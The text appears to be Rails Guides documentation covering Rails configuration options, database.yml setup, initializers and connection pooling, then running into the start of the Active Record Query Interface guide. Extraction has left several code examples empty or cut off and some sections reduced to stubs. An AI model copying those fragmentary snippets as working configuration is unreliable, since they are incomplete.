config.middleware.delete "Rack::MethodOverride"
### Configuring i18n
All these configuration options are delegated to the `I18n` library.
* `config.i18n.available_locales` whitelists the available locales for the app. 
Defaults to all locale keys found in locale files, usually only `:en` on a new application.
* `config.i18n.default_locale` sets the default locale of an application used for i18n. 
Defaults to `:en`.
* `config.i18n.enforce_available_locales` ensures that all locales passed through i18n must be declared in the `available_locales` list, raising an `I18n::InvalidLocale` exception when setting an unavailable locale. 
Defaults to `true`. 
It is recommended not to disable this option unless strongly required, since this works as a security measure against setting any invalid locale from user input.
* `config.i18n.load_path` sets the path Rails uses to look for locale files. 
Defaults to `config/locales/*.{yml,rb}`.
### Configuring Active Record
`config.active_record` includes a variety of configuration options:
* `config.active_record.logger` accepts a logger conforming to the interface of Log4r or the default Ruby Logger class, which is then passed on to any new database connections made. 
You can retrieve this logger by calling `logger` on either an Active Record model class or an Active Record model instance. 
Set to `nil` to disable logging.
* `config.active_record.primary_key_prefix_type` lets you adjust the naming for primary key columns. 
By default, Rails assumes that primary key columns are named `id` (and this configuration option doesn't need to be set.) 
There are two other choices:
** `:table_name` would make the primary key for the Customer class `customerid`
** `:table_name_with_underscore` would make the primary key for the Customer class `customer_id`
* `config.active_record.table_name_prefix` lets you set a global string to be prepended to table names. 
If you set this to `northwest_`, then the Customer class will look for `northwest_customers` as its table. 
The default is an empty string.
* `config.active_record.table_name_suffix` lets you set a global string to be appended to table names. 
If you set this to `_northwest`, then the Customer class will look for `customers_northwest` as its table. 
* `config.active_record.schema_migrations_table_name` lets you set a string to be used as the name of the schema migrations table.
* `config.active_record.pluralize_table_names` specifies whether Rails will look for singular or plural table names in the database. 
If set to true (the default), then the Customer class will use the `customers` table. 
If set to false, then the Customer class will use the `customer` table.
* `config.active_record.default_timezone` determines whether to use `Time.local` (if set to `:local`) or `Time.utc` (if set to `:utc`) when pulling dates and times from the database. 
The default is `:utc`.
* `config.active_record.schema_format` controls the format for dumping the database schema to a file. 
The options are `:ruby` (the default) for a database-independent version that depends on migrations, or `:sql` for a set of (potentially database-dependent) SQL statements.
* `config.active_record.timestamped_migrations` controls whether migrations are numbered with serial integers or with timestamps. 
The default is true, to use timestamps, which are preferred if there are multiple developers working on the same application.
* `config.active_record.lock_optimistically` controls whether Active Record will use optimistic locking and is true by default.
* `config.active_record.cache_timestamp_format` controls the format of the timestamp value in the cache key. 
Default is `:number`.
* `config.active_record.record_timestamps` is a boolean value which controls whether or not timestamping of `create` and `update` operations on a model occur. 
The default value is `true`.
* `config.active_record.partial_writes` is a boolean value and controls whether or not partial writes are used (i.e. whether updates only set attributes that are dirty). 
Note that when using partial writes, you should also use optimistic locking `config.active_record.lock_optimistically` since concurrent updates may write attributes based on a possibly stale read state. 
* `config.active_record.maintain_test_schema` is a boolean value which controls whether Active Record should try to keep your test database schema up-to-date with `db/schema.rb` (or `db/structure.sql`) when you run your tests. 
The default is true.
* `config.active_record.dump_schema_after_migration` is a flag which<n>  controls whether or not schema dump should happen (`db/schema.rb` or<n>  `db/structure.sql`) when you run migrations. 
This is set to false in<n>  `config/environments/production.rb` which is generated by Rails. 
The<n>  default value is true if this configuration is not set.
The MySQL adapter adds one additional configuration option:
* `ActiveRecord::ConnectionAdapters::MysqlAdapter.emulate_booleans` controls whether Active Record will consider all `tinyint(1)` columns in a MySQL database to be booleans and is true by default.
The schema dumper adds one additional configuration option:
* `ActiveRecord::SchemaDumper.ignore_tables` accepts an array of tables that should _not_ be included in any generated schema file. 
This setting is ignored unless `config.active_record.schema_format == :ruby`.
### Configuring Action Controller
`config.action_controller` includes a number of configuration settings:
* `config.action_controller.asset_host` sets the host for the assets. 
Useful when CDNs are used for hosting assets rather than the application server itself.
* `config.action_controller.perform_caching` configures whether the application should perform caching or not. 
Set to false in development mode, true in production.
* `config.action_controller.default_static_extension` configures the extension used for cached pages. 
Defaults to `.html`.
* `config.action_controller.default_charset` specifies the default character set for all renders. 
The default is "utf-8".
* `config.action_controller.logger` accepts a logger conforming to the interface of Log4r or the default Ruby Logger class, which is then used to log information from Action Controller. 
* `config.action_controller.request_forgery_protection_token` sets the token parameter name for RequestForgery. 
Calling `protect_from_forgery` sets it to `:authenticity_token` by default.
* `config.action_controller.allow_forgery_protection` enables or disables CSRF protection. 
By default this is `false` in test mode and `true` in all other modes.
* `config.action_controller.relative_url_root` can be used to tell Rails that you are [deploying to a subdirectory](configuring.html#deploy-to-a-subdirectory-relative-url-root). 
The default is `ENV['RAILS_RELATIVE_URL_ROOT']`.
* `config.action_controller.permit_all_parameters` sets all the parameters for mass assignment to be permitted by default. 
The default value is `false`.
* `config.action_controller.action_on_unpermitted_parameters` enables logging or raising an exception if parameters that are not explicitly permitted are found. 
Set to `:log` or `:raise` to enable. 
The default value is `:log` in development and test environments, and `false` in all other environments.
### Configuring Action Dispatch
* `config.action_dispatch.session_store` sets the name of the store for session data. 
The default is `:cookie_store`; other valid options include `:active_record_store`, `:mem_cache_store` or the name of your own custom class.
* `config.action_dispatch.default_headers` is a hash with HTTP headers that are set by default in each response. 
By default, this is defined as:
    config.action_dispatch.default_headers = {
      'X-Frame-Options' => 'SAMEORIGIN',
      'X-XSS-Protection' => '1; mode=block',
      'X-Content-Type-Options' => 'nosniff'
    }
* `config.action_dispatch.tld_length` sets the TLD (top-level domain) length for the application. 
Defaults to `1`.
* `config.action_dispatch.http_auth_salt` sets the HTTP Auth salt value. 
Defaults<n>to `'http authentication'`.
* `config.action_dispatch.signed_cookie_salt` sets the signed cookies salt value.<n>
Defaults to `'signed cookie'`.
* `config.action_dispatch.encrypted_cookie_salt` sets the encrypted cookies salt<n>value. 
Defaults to `'encrypted cookie'`.
* `config.action_dispatch.encrypted_signed_cookie_salt` sets the signed<n>encrypted cookies salt value. 
Defaults to `'signed encrypted cookie'`.
* `config.action_dispatch.perform_deep_munge` configures whether `deep_munge`<n>  method should be performed on the parameters. 
See [Security Guide](security.html#unsafe-query-generation)<n>  for more information. 
It defaults to true.
  ```ruby
  ```
* `ActionDispatch::Callbacks.before` takes a block of code to run before the request.
* `ActionDispatch::Callbacks.to_prepare` takes a block to run after `ActionDispatch::Callbacks.before`, but before the request. 
Runs for every request in `development` mode, but only once for `production` or environments with `cache_classes` set to `true`.
* `ActionDispatch::Callbacks.after` takes a block of code to run after the request.
### Configuring Action View
`config.action_view` includes a small number of configuration settings:
* `config.action_view.field_error_proc` provides an HTML generator for displaying errors that come from Active Record. 
    Proc.new do |html_tag, instance|
      %Q(<div class="field_with_errors">#{html_tag}</div>).html_safe
* `config.action_view.default_form_builder` tells Rails which form builder to use by default. 
The default is `ActionView::Helpers::FormBuilder`. 
If you want your form builder class to be loaded after initialization (so it's reloaded on each request in development), you can pass it as a `String`
* `config.action_view.logger` accepts a logger conforming to the interface of Log4r or the default Ruby Logger class, which is then used to log information from Action View. 
* `config.action_view.erb_trim_mode` gives the trim mode to be used by ERB. 
It defaults to `'-'`, which turns on trimming of tail spaces and newline when using `<%= -%>` or `<%= =%>`. 
See the [Erubis documentation](http://www.kuwata-lab.com/erubis/users-guide.06.html#topics-trimspaces) for more information.
* `config.action_view.embed_authenticity_token_in_remote_forms` allows you to set the default behavior for `authenticity_token` in forms with `:remote => true`. 
By default it's set to false, which means that remote forms will not include `authenticity_token`, which is helpful when you're fragment-caching the form. 
Remote forms get the authenticity from the `meta` tag, so embedding is unnecessary unless you support browsers without JavaScript. 
In such case you can either pass `:authenticity_token => true` as a form option or set this config setting to `true`
* `config.action_view.prefix_partial_path_with_controller_namespace` determines whether or not partials are looked up from a subdirectory in templates rendered from namespaced controllers. 
    ```erb
* `config.action_view.raise_on_missing_translations` determines whether an error should be raised for missing translations
### Configuring Action Mailer
There are a number of settings available on `config.action_mailer`:
* `config.action_mailer.logger` accepts a logger conforming to the interface of Log4r or the default Ruby Logger class, which is then used to log information from Action Mailer. 
* `config.action_mailer.smtp_settings` allows detailed configuration for the `:smtp` delivery method. 
It accepts a hash of options, which can include any of these options:
    * `:address` - Allows you to use a remote mail server. 
Just change it from its default "localhost" setting.
    * `:port` - On the off chance that your mail server doesn't run on port 25, you can change it.
    * `:domain` - If you need to specify a HELO domain, you can do it here.
    * `:user_name` - If your mail server requires authentication, set the username in this setting.
    * `:password` - If your mail server requires authentication, set the password in this setting.
    * `:authentication` - If your mail server requires authentication, you need to specify the authentication type here. 
This is a symbol and one of `:plain`, `:login`, `:cram_md5`.
* `config.action_mailer.sendmail_settings` allows detailed configuration for the `sendmail` delivery method. 
    * `:location` - The location of the sendmail executable. 
Defaults to `/usr/sbin/sendmail`.
    * `:arguments` - The command line arguments. 
Defaults to `-i -t`.
* `config.action_mailer.raise_delivery_errors` specifies whether to raise an error if email delivery cannot be completed. 
* `config.action_mailer.delivery_method` defines the delivery method and defaults to `:smtp`. 
See the [configuration section in the Action Mailer guide](http://guides.rubyonrails.org/action_mailer_basics.html#action-mailer-configuration) for more info.
* `config.action_mailer.perform_deliveries` specifies whether mail will actually be delivered and is true by default. 
It can be convenient to set it to false for testing.
* `config.action_mailer.default_options` configures Action Mailer defaults. 
Use to set options like `from` or `reply_to` for every mailer. 
These default to:
    mime_version:  "1.0",
    charset:       "UTF-8",
    content_type: "text/plain",
    parts_order:  ["text/plain", "text/enriched", "text/html"]
    Assign a hash to set additional options:
    config.action_mailer.default_options = {
      from: "noreply@example.com"
* `config.action_mailer.observers` registers observers which will be notified when mail is delivered.
    config.action_mailer.observers = ["MailObserver"]
* `config.action_mailer.interceptors` registers interceptors which will be called before mail is sent.
    config.action_mailer.interceptors = ["MailInterceptor"]
    ```ruby
### Configuring Active Support
There are a few configuration options available in Active Support:
* `config.active_support.bare` enables or disables the loading of `active_support/all` when booting Rails. 
Defaults to `nil`, which means `active_support/all` is loaded.
* `config.active_support.escape_html_entities_in_json` enables or disables the escaping of HTML entities in JSON serialization. 
* `config.active_support.use_standard_json_time_format` enables or disables serializing dates to ISO 8601 format. 
Defaults to `true`.<n><n>
* `config.active_support.time_precision` sets the precision of JSON encoded time values. 
Defaults to `3`.
* `ActiveSupport::Logger.silencer` is set to `false` to disable the ability to silence logging in a block. 
The default is `true`.
* `ActiveSupport::Cache::Store.logger` specifies the logger to use within cache store operations.
* `ActiveSupport::Deprecation.behavior` alternative setter to `config.active_support.deprecation` which configures the behavior of deprecation warnings for Rails.
* `ActiveSupport::Deprecation.silence` takes a block in which all deprecation warnings are silenced.
* `ActiveSupport::Deprecation.silenced` sets whether or not to display deprecation warnings.
### Configuring a Database
Just about every Rails application will interact with a database. 
You can connect to the database by setting an environment variable `ENV['DATABASE_URL']` or by using a configuration file called `config/database.yml`.
Using the `config/database.yml` file you can specify all the information needed to access your database:
```yaml
development:
  adapter: postgresql
  database: blog_development
  pool: 5
This will connect to the database named `blog_development` using the `postgresql` adapter. 
This same information can be stored in a URL and provided via an environment variable like this:
> puts ENV['DATABASE_URL']
The `config/database.yml` file contains sections for three different environments in which Rails can run by default:
* The `development` environment is used on your development/local computer as you interact manually with the application.
* The `test` environment is used when running automated tests.
* The `production` environment is used when you deploy your application for the world to use.
If you wish, you can manually specify a URL inside of your `config/database.yml`
  url: postgresql://localhost/blog_development?
The `config/database.yml` file can contain ERB tags `<%= %>`. 
Anything in the tags will be evaluated as Ruby code. 
You can use this to pull out data from an environment variable or to perform calculations to generate the needed connection information.
TIP: You don't have to update the database configurations manually. 
If you look at the options of the application generator, you will see that one of the options is named `--database`. 
This option allows you to choose an adapter from a list of the most used relational databases. 
You can even run the generator repeatedly: `cd .. && rails new blog --database=mysql`. 
When you confirm the overwriting of the `config/database.yml` file, your application will be configured for MySQL instead of SQLite. 
Detailed examples of the common database connections are below.
### Connection Preference
Since there are two ways to set your connection, via environment variable it is important to understand how the two can interact.
If you have an empty `config/database.yml` file but your `ENV['DATABASE_URL']` is present, then Rails will connect to the database via your environment variable:
$ cat config/database.yml
$ echo $DATABASE_URL
postgresql://localhost/my_database
If you have a `config/database.yml` but no `ENV['DATABASE_URL']` then this file will be used to connect to your database:
  database: my_database
  host: localhost
If you have both `config/database.yml` and `ENV['DATABASE_URL']` set then Rails will merge the configuration together. 
To better understand this we must see some examples.
When duplicate connection information is provided the environment variable will take precedence:
  adapter: sqlite3
  database: NOT_my_database
{"development"=>{"adapter"=>"postgresql", "host"=>"localhost", "database"=>"my_database"}}
Here the adapter, host, and database match the information in `ENV['DATABASE_URL']`.
If non-duplicate information is provided you will get all unique values, environment variable still takes precedence in cases of any conflicts.
{"development"=>{"adapter"=>"postgresql", "host"=>"localhost", "database"=>"my_database", "pool"=>5}}
Since pool is not in the `ENV['DATABASE_URL']` provided connection information its information is merged in. 
Since `adapter` is duplicate, the `ENV['DATABASE_URL']` connection information wins.
The only way to explicitly not use the connection information in `ENV['DATABASE_URL']` is to specify an explicit URL connection using the `"url"` sub key:
  url: sqlite3:NOT_my_database
{"development"=>{"adapter"=>"sqlite3", "database"=>"NOT_my_database"}}
Here the connection information in `ENV['DATABASE_URL']` is ignored, note the different adapter and database name.
Since it is possible to embed ERB in your `config/database.yml` it is best practice to explicitly show you are using the `ENV['DATABASE_URL']` to connect to your database. 
This is especially useful in production since you should not commit secrets like your database password into your source control (such as Git).
production:
  url: <%= ENV['DATABASE_URL'] %>
Now the behavior is clear, that we are only using the connection information in `ENV['DATABASE_URL']`.
#### Configuring an SQLite3 Database
Rails comes with built-in support for [SQLite3](http://www.sqlite.org), which is a lightweight serverless database application. 
While a busy production environment may overload SQLite, it works well for development and testing. 
Rails defaults to using an SQLite database when creating a new project, but you can always change it later.
Here's the section of the default configuration file (`config/database.yml`) with connection information for the development environment:
  database: db/development.sqlite3
  timeout: 5000
NOTE: Rails uses an SQLite3 database for data storage by default because it is a zero configuration database that just works. 
Rails also supports MySQL and PostgreSQL "out of the box", and has plugins for many database systems. 
If you are using a database in a production environment Rails most likely has an adapter for it.
#### Configuring a MySQL Database
If you choose to use MySQL instead of the shipped SQLite3 database, your `config/database.yml` will look a little different. 
Here's the development section:
  adapter: mysql2
  encoding: utf8
  username: root
  password:
  socket: /tmp/mysql.sock
If your development computer's MySQL installation includes a root user with an empty password, this configuration should work for you. 
Otherwise, change the username and password in the `development` section as appropriate.
#### Configuring a PostgreSQL Database
If you choose to use PostgreSQL, your `config/database.yml` will be customized to use PostgreSQL databases:
  encoding: unicode
Prepared Statements are enabled by default on PostgreSQL. 
You can be disable prepared statements by setting `prepared_statements` to `false`:
  prepared_statements: false
If enabled, Active Record will create up to `1000` prepared statements per database connection by default. 
To modify this behavior you can set `statement_limit` to a different value:
  statement_limit: 200
The more prepared statements in use: the more memory your database will require. 
If your PostgreSQL database is hitting memory limits, try lowering `statement_limit` or disabling prepared statements.
#### Configuring an SQLite3 Database for JRuby Platform
If you choose to use SQLite3 and are using JRuby, your `config/database.yml` will look a little different. 
Here's the development section:
  adapter: jdbcsqlite3
#### Configuring a MySQL Database for JRuby Platform
If you choose to use MySQL and are using JRuby, your `config/database.yml` will look a little different. 
  adapter: jdbcmysql
#### Configuring a PostgreSQL Database for JRuby Platform
If you choose to use PostgreSQL and are using JRuby, your `config/database.yml` will look a little different. 
  adapter: jdbcpostgresql
  username: blog
Change the username and password in the `development` section as appropriate.
### Creating Rails Environments
By default Rails ships with three environments: "development", "test", and "production". 
While these are sufficient for most use cases, there are circumstances when you want more environments.
Imagine you have a server which mirrors the production environment but is only used for testing. 
Such a server is commonly called a "staging server". 
To define an environment called "staging" for this server, just create a file called `config/environments/staging.rb`. 
Please use the contents of any existing file in `config/environments` as a starting point and make the necessary changes from there.
That environment is no different than the default ones, start a server with `rails server -e staging`, a console with `rails console staging`, `Rails.env.staging?` works, etc.
### Deploy to a subdirectory (relative url root)
By default Rails expects that your application is running at the root<n>(eg. `/`). 
This section explains how to run your application inside a directory.
Let's assume we want to deploy our application to "/app1". 
Rails needs to know<n>this directory to generate the appropriate routes:
config.relative_url_root = "/app1"
alternatively you can set the `RAILS_RELATIVE_URL_ROOT` environment<n>variable.
Rails will now prepend "/app1" when generating links.
#### Using Passenger
Passenger makes it easy to run your application in a subdirectory. 
#### Using a Reverse Proxy
change
#### Considerations when deploying to a subdirectory
Deploying to a subdirectory in production has implications on various parts of<n>Rails.
* development environment:
* testing environment:
* serving static assets:
* asset pipeline:
Rails Environment Settings
--------------------------
Some parts of Rails can also be configured externally by supplying environment variables. 
* `ENV["RAILS_ENV"]` defines the Rails environment (production, development, test, and so on) that Rails will run under.
* `ENV["RAILS_RELATIVE_URL_ROOT"]` is used by the routing code to recognize URLs when you [deploy your application to a subdirectory](configuring.html#deploy-to-a-subdirectory-relative-url-root).
* `ENV["RAILS_CACHE_ID"]` and `ENV["RAILS_APP_VERSION"]` are used to generate expanded cache keys in Rails' caching code. 
This allows you to have multiple separate caches from the same application.
Using Initializer Files
After loading the framework and any gems in your application, Rails turns to loading initializers. 
An initializer is any Ruby file stored under `config/initializers` in your application. 
You can use initializers to hold configuration settings that should be made after all of the frameworks and gems are loaded, such as options to configure settings for these parts.
NOTE: You can use subfolders to organize your initializers if you like, because Rails will look into the whole file hierarchy from the initializers folder on down.
TIP: If you have any ordering dependency in your initializers, you can control the load order through naming. 
Initializer files are loaded in alphabetical order by their path. 
For example, `01_critical.rb` will be loaded before `02_normal.rb`.
Initialization events
Rails has 5 initialization events which can be hooked into (listed in the order that they are run):
* `before_configuration`: This is run as soon as the application constant inherits from `Rails::Application`. 
The `config` calls are evaluated before this happens.
* `before_initialize`: This is run directly before the initialization process of the application occurs with the `:bootstrap_hook` initializer near the beginning of the Rails initialization process.
* `to_prepare`: Run after the initializers are run for all Railties (including the application itself), but before eager loading and the middleware stack is built. 
More importantly, will run upon every request in `development`, but only once (during boot-up) in `production` and `test`.
* `before_eager_load`: This is run directly before eager loading occurs, which is the default behavior for the `production` environment and not for the `development` environment.
* `after_initialize`: Run directly after the initialization of the application, after the application initializers in `config/initializers` are run.
To define an event for these hooks, use the block syntax within a `Rails::Application`, `Rails::Railtie` or `Rails::Engine` subclass:
module YourApp
  class Application < Rails::Application
    config.before_initialize do
      # initialization code goes here
Alternatively, you can also do it through the `config` method on the `Rails.application` object:
Rails.application.config.before_initialize do
  # initialization code goes here
WARNING: Some parts of your application, notably routing, are not yet set up at the point where the `after_initialize` block is called.
### `Rails::Railtie#initializer`
Rails has several initializers that run on startup that are all defined by using the `initializer` method from `Rails::Railtie`. 
Here's an example of the `set_helpers_path` initializer from Action Controller:
initializer "action_controller.set_helpers_path" do |app|
  ActionController::Helpers.helpers_path = app.helpers_paths
The `initializer` method takes three arguments with the first being the name for the initializer and the second being an options hash (not shown here) and the third being a block. 
The `:before` key in the options hash can be specified to specify which initializer this new initializer must run before, and the `:after` key will specify which initializer to run this initializer _after_.
Initializers defined using the `initializer` method will be run in the order they are defined in, with the exception of ones that use the `:before` or `:after` methods.
WARNING: You may put your initializer before or after any other initializer in the chain, as long as it is logical. 
Say you have 4 initializers called "one" through "four" (defined in that order) and you define "four" to go _before_ "four" but _after_ "three", that just isn't logical and Rails will not be able to determine your initializer order.
The block argument of the `initializer` method is the instance of the application itself, and so we can access the configuration on it by using the `config` method as done in the example.
Because `Rails::Application` inherits from `Rails::Railtie` (indirectly), you can use the `initializer` method in `config/application.rb` to define initializers for the application.
### Initializers
Below is a comprehensive list of all the initializers found in Rails in the order that they are defined (and therefore run in, unless otherwise stated).
* `load_environment_hook` Serves as a placeholder so that `:load_environment_config` can be defined to run before it.
* `load_active_support` Requires `active_support/dependencies` which sets up the basis for Active Support. 
Optionally requires `active_support/all` if `config.active_support.bare` is un-truthful, which is the default.
* `initialize_logger` Initializes the logger (an `ActiveSupport::Logger` object) for the application and makes it accessible at `Rails.logger`, provided that no initializer inserted before this point has defined `Rails.logger`.
* `initialize_cache` If `Rails.cache` isn't set yet, initializes the cache by referencing the value in `config.cache_store` and stores the outcome as `Rails.cache`. 
If this object responds to the `middleware` method, its middleware is inserted before `Rack::Runtime` in the middleware stack.
* `set_clear_dependencies_hook` Provides a hook for `active_record.set_dispatch_hooks` to use, which will run before this initializer. 
This initializer - which runs only if `cache_classes` is set to `false` - uses `ActionDispatch::Callbacks.after` to remove the constants which have been referenced during the request from the object space so that they will be reloaded during the following request.
* `initialize_dependency_mechanism` If `config.cache_classes` is true, configures `ActiveSupport::Dependencies.mechanism` to `require` dependencies rather than `load` them.
* `bootstrap_hook` Runs all configured `before_initialize` blocks.
* `i18n.callbacks` In the development environment, sets up a `to_prepare` callback which will call `I18n.reload!` if any of the locales have changed since the last request. 
In production mode this callback will only run on the first request.
* `active_support.deprecation_behavior` Sets up deprecation reporting for environments, defaulting to `:log` for development, `:notify` for production and `:stderr` for test. 
If a value isn't set for `config.active_support.deprecation` then this initializer will prompt the user to configure this line in the current environment's `config/environments` file. 
Can be set to an array of values.
* `active_support.initialize_time_zone` Sets the default time zone for the application based on the `config.time_zone` setting, which defaults to "UTC".
* `active_support.initialize_beginning_of_week` Sets the default beginning of week for the application based on `config.beginning_of_week` setting, which defaults to `:monday`.
* `action_dispatch.configure` Configures the `ActionDispatch::Http::URL.tld_length` to be set to the value of `config.action_dispatch.tld_length`.
* `action_view.set_configs` Sets up Action View by using the settings in `config.action_view` by `send`'ing the method names as setters to `ActionView::Base` and passing the values through.
* `action_controller.logger` Sets `ActionController::Base.logger` - if it's not already set - to `Rails.logger`.
* `action_controller.initialize_framework_caches` Sets `ActionController::Base.cache_store` - if it's not already set - to `Rails.cache`.
* `action_controller.set_configs` Sets up Action Controller by using the settings in `config.action_controller` by `send`'ing the method names as setters to `ActionController::Base` and passing the values through.
* `action_controller.compile_config_methods` Initializes methods for the config settings specified so that they are quicker to access.
* `active_record.initialize_timezone` Sets `ActiveRecord::Base.time_zone_aware_attributes` to true, as well as setting `ActiveRecord::Base.default_timezone` to UTC. When attributes are read from the database, they will be converted into the time zone specified by `Time.zone`.
* `active_record.logger` Sets `ActiveRecord::Base.logger` - if it's not already set - to `Rails.logger`.
* `active_record.set_configs` Sets up Active Record by using the settings in `config.active_record` by `send`'ing the method names as setters to `ActiveRecord::Base` and passing the values through.
* `active_record.initialize_database` Loads the database configuration (by default) from `config/database.yml` and establishes a connection for the current environment.
* `active_record.log_runtime` Includes `ActiveRecord::Railties::ControllerRuntime` which is responsible for reporting the time taken by Active Record calls for the request back to the logger.
* `active_record.set_dispatch_hooks` Resets all reloadable connections to the database if `config.cache_classes` is set to `false`.
* `action_mailer.logger` Sets `ActionMailer::Base.logger` - if it's not already set - to `Rails.logger`.
* `action_mailer.set_configs` Sets up Action Mailer by using the settings in `config.action_mailer` by `send`'ing the method names as setters to `ActionMailer::Base` and passing the values through.
* `action_mailer.compile_config_methods` Initializes methods for the config settings specified so that they are quicker to access.
* `set_load_path` This initializer runs before `bootstrap_hook`. 
Adds the `vendor`, `lib`, all directories of `app` and any paths specified by `config.load_paths` to `$LOAD_PATH`.
* `set_autoload_paths` This initializer runs before `bootstrap_hook`. 
Adds all sub-directories of `app` and paths specified by `config.autoload_paths` to `ActiveSupport::Dependencies.autoload_paths`.
* `add_routing_paths` Loads (by default) all `config/routes.rb` files (in the application and railties, including engines) and sets up the routes for the application.
* `add_locales` Adds the files in `config/locales` (from the application, railties and engines) to `I18n.load_path`, making available the translations in these files.
* `add_view_paths` Adds the directory `app/views` from the application, railties and engines to the lookup path for view files for the application.
* `load_environment_config` Loads the `config/environments` file for the current environment.
* `append_asset_paths` Finds asset paths for the application and all attached railties and keeps a track of the available directories in `config.static_asset_paths`.
* `prepend_helpers_path` Adds the directory `app/helpers` from the application, railties and engines to the lookup path for helpers for the application.
* `load_config_initializers` Loads all Ruby files from `config/initializers` in the application, railties and engines. 
The files in this directory can be used to hold configuration settings that should be made after all of the frameworks are loaded.
* `engines_blank_point` Provides a point-in-initialization to hook into if you wish to do anything before engines are loaded. 
After this point, all railtie and engine initializers are run.
* `add_generator_templates` Finds templates for generators at `lib/templates` for the application, railties and engines and adds these to the `config.generators.templates` setting, which will make the templates available for all generators to reference.
* `ensure_autoload_once_paths_as_subset` Ensures that the `config.autoload_once_paths` only contains paths from `config.autoload_paths`. 
If it contains extra paths, then an exception will be raised.
* `add_to_prepare_blocks` The block for every `config.to_prepare` call in the application, a railtie or engine is added to the `to_prepare` callbacks for Action Dispatch which will be run per request in development, or before the first request in production.
* `add_builtin_route` If the application is running under the development environment then this will append the route for `rails/info/properties` to the application routes. 
This route provides the detailed information such as Rails and Ruby version for `public/index.html` in a default Rails application.
* `build_middleware_stack` Builds the middleware stack for the application, returning an object which has a `call` method which takes a Rack environment object for the request.
* `eager_load!` If `config.eager_load` is true, runs the `config.before_eager_load` hooks and then calls `eager_load!` which will load all `config.eager_load_namespaces`.
* `finisher_hook` Provides a hook for after the initialization of process of the application is complete, as well as running all the `config.after_initialize` blocks for the application, railties and engines.
* `set_routes_reloader` Configures Action Dispatch to reload the routes file using `ActionDispatch::Callbacks.to_prepare`.
* `disable_dependency_loading` Disables the automatic dependency loading if the `config.eager_load` is set to true.
Database pooling
----------------
Active Record database connections are managed by `ActiveRecord::ConnectionAdapters::ConnectionPool` which ensures that a connection pool synchronizes the amount of thread access to a limited number of database connections. 
This limit defaults to 5 and can be configured in `database.yml`.
Since the connection pooling is handled inside of Active Record by default, all application servers (Thin, mongrel, Unicorn etc.) should behave the same. 
Initially, the database connection pool is empty and it will create additional connections as the demand for them increases, until it reaches the connection pool limit.
Any one request will check out a connection the first time it requires access to the database, after which it will check the connection back in, at the end of the request, meaning that the additional connection slot will be available again for the next request in the queue.
If you try to use more connections than are available, Active Record will block<n>and wait for a connection from the pool. 
When it cannot get connection, a timeout<n>error similar to given below will be thrown.
ActiveRecord::ConnectionTimeoutError - could not obtain a database connection within 5 seconds. 
The max pool size is currently 5; consider increasing it:
If you get the above error, you might want to increase the size of connection<n>pool by incrementing the `pool` option in `database.yml`
NOTE. If you are running in a multi-threaded environment, there could be a chance that several threads may be accessing multiple connections simultaneously. 
So depending on your current request load, you could very well have multiple threads contending for a limited amount of connections.
  ```ruby
=> true
Active Record Query Interface
=============================
This guide covers different ways to retrieve data from the database using Active Record.
* How to find records using a variety of methods and conditions.
* How to specify the order, retrieved attributes, grouping, and other properties of the found records.
* How to use eager loading to reduce the number of database queries needed for data retrieval.
* How to use dynamic finders methods.
* How to check for the existence of particular records.
* How to perform various calculations on Active Record models.
* How to run EXPLAIN on relations.
If you're used to using raw SQL to find database records, then you will generally find that there are better ways to carry out the same operations in Rails. 
Active Record insulates you from the need to use SQL in most cases.
Code examples throughout this guide will refer to one or more of the following models:
TIP: All of the following models use `id` as the primary key, unless specified otherwise.
class Client < ActiveRecord::Base
  has_one :address
  has_many :orders
  has_and_belongs_to_many :roles
class Address < ActiveRecord::Base
  belongs_to :client
class Order < ActiveRecord::Base
  belongs_to :client, counter_cache: true
class Role < ActiveRecord::Base
  has_and_belongs_to_many :clients
Active Record will perform queries on the database for you and is compatible with most database systems (MySQL, PostgreSQL and SQLite to name a few). 
Regardless of which database system you're using, the Active Record method format will always be the same.
Retrieving Objects from the Database
------------------------------------
To retrieve objects from the database, Active Record provides several finder methods. 
Each finder method allows you to pass arguments into it to perform certain queries on your database without writing raw SQL.
The methods are:
* `bind`
* `create_with`
* `distinct`
* `eager_load`
* `extending`
* `from`
* `group`
* `having`
* `includes`
* `joins`
* `limit`
* `lock`
* `none`
* `offset`
* `order`
* `preload`
* `readonly`
* `references`
* `reorder`
* `reverse_order`
* `select`
* `uniq`
* `where`
All of the above methods return an instance of `ActiveRecord::Relation`.
The primary operation of `Model.find(options)` can be summarized as:
* Convert the supplied options to an equivalent SQL query.
* Fire the SQL query and retrieve the corresponding results from the database.
* Instantiate the equivalent Ruby object of the appropriate model for every resulting row.
### Retrieving a Single Object
Active Record provides several different ways of retrieving a single object.
#### `find`
Using the `find` method, you can retrieve the object corresponding to the specified _primary key_ that matches any supplied options. 
For example:
# Find the client with primary key (id) 10.
client = Client.find(10)
# => #<Client id: 10, first_name: "Ryan">
The SQL equivalent of the above is:
SELECT * FROM clients WHERE (clients.id = 10) LIMIT 1
The `find` method will raise an `ActiveRecord::RecordNotFound` exception if no matching record is found.
You can also use this method to query for multiple objects. 
Call the `find` method and pass in an array of primary keys. 
The return will be an array containing all of the matching records for the supplied _primary keys_. 
# Find the clients with primary keys 1 and 10.
client = Client.find([1, 10]) # Or even Client.find(1, 10)
# => [#<Client id: 1, first_name: "Lifo">, #<Client id: 10, first_name: "Ryan">]
SELECT * FROM clients WHERE (clients.id IN (1,10))
WARNING: The `find` method will raise an `ActiveRecord::RecordNotFound` exception unless a matching record is found for **all** of the supplied primary keys.
#### `take`
The `take` method retrieves a record without any implicit ordering. 
client = Client.take
# => #<Client id: 1, first_name: "Lifo">
SELECT * FROM clients LIMIT 1
The `take` method returns `nil` if no record is found and no exception will be raised.
You can pass in a numerical argument to the `take` method to return up to that number of results. 
For example
client = Client.take(2)
# => [
  #<Client id: 1, first_name: "Lifo">,
  #<Client id: 220, first_name: "Sara">
SELECT * FROM clients LIMIT 2
TIP: The retrieved record may vary depending on the database engine.
#### `first`
The `first` method finds the first record ordered by the primary key. 
client = Client.first
SELECT * FROM clients ORDER BY clients.id ASC LIMIT 1
The `first` method returns `nil` if no matching record is found and no exception will be raised.
You can pass in a numerical argument to the `first` method to return up to that number of results. 
For example
client = Client.first(3)
  #<Client id: 2, first_name: "Fifo">,
  #<Client id: 3, first_name: "Filo">
SELECT * FROM clients ORDER BY clients.id ASC LIMIT 3
The `first!` method behaves exactly like `first`, except that it will raise `ActiveRecord::RecordNotFound` if no matching record is found.
#### `last`
The `last` method finds the last record ordered by the primary key. 
client = Client.last
# => #<Client id: 221, first_name: "Russel">
SELECT * FROM clients ORDER BY clients.id DESC LIMIT 1
